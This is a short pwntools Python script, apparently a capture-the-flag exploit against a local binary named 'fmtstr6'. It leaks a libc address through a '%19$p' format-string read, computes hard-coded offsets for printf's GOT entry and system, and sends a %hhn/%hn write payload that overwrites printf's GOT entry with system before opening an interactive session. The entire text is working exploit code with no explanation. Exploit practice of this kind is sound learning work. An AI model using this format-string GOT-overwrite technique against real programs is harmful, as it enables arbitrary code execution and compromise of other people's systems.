#!/bin/python
from pwn import *
exe = ELF('./fmtstr6')

p = process(exe.path)
context.terminal = ['alacritty', '-e']
gdb.attach(p, gdbscript='''
b*main+90
           c
           c

           ''')

payload = b'%19$p'
p.sendlineafter(b'string: ', payload)
libc_start_main = int(p.recvline(), 16)
got_printf_leak = libc_start_main + 2004712
binary_base = libc_start_main + 1991472
got_system_leak = libc_start_main + 162448
log.info('libc_start_main: ' + hex(libc_start_main))
log.info('got_printf_leak: ' + hex(got_printf_leak))
log.info('binary_base: ' + hex(binary_base))
log.info('got_system_leak: ' + hex(got_system_leak))
part1 = got_system_leak & 0xff
part2 = (got_system_leak >> 8) & 0xffff
log.info('part1: ' + hex(part1))
log.info('part2: ' + hex(part2))
payload = f'%{part1}c%12$hhn'.encode() # %13$hn write 2 bytes at time
# %13$hhn write 1 byte at time 
payload += f'%{part2 - part1}c%13$hn'.encode()
payload = payload.ljust(48, b'\x00')
payload += p64(got_printf_leak)
payload += p64(got_printf_leak + 1)
p.sendlineafter(b'string: ', payload)
p.interactive()

